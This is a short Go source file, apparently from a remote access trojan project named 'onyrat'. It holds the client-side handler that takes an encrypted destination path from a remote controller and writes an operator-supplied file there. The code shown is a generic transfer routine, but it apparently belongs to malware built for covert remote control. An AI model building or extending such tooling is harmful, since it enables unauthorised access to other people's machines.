//go:build client
// +build client

package handlers

import (
	"context"
	"fmt"
	"time"

	"github.com/Onyz107/onyrat/internal/logger"
	"github.com/Onyz107/onyrat/pkg/commands/transfer"
	"github.com/Onyz107/onyrat/pkg/network"
	"github.com/xtaci/smux"
)

func HandleUpload(c *network.KCPClient, stream *smux.Stream, ctx context.Context) error {
	buf := smallBufPool.Get().([]byte)
	defer smallBufPool.Put(buf)

	// Get output path
	n, err := c.ReceiveEncrypted(stream, buf, 10*time.Second)
	if err != nil {
		return fmt.Errorf("failed to get output path: %w", err)
	}

	go func() {
		if err := transfer.Download(c, c.Manager, string(buf[:n]), ctx); err != nil {
			logger.Log.Errorf("failed to download file to: %s: %w", string(buf[:n]), err)
		}
	}()

	return nil
}
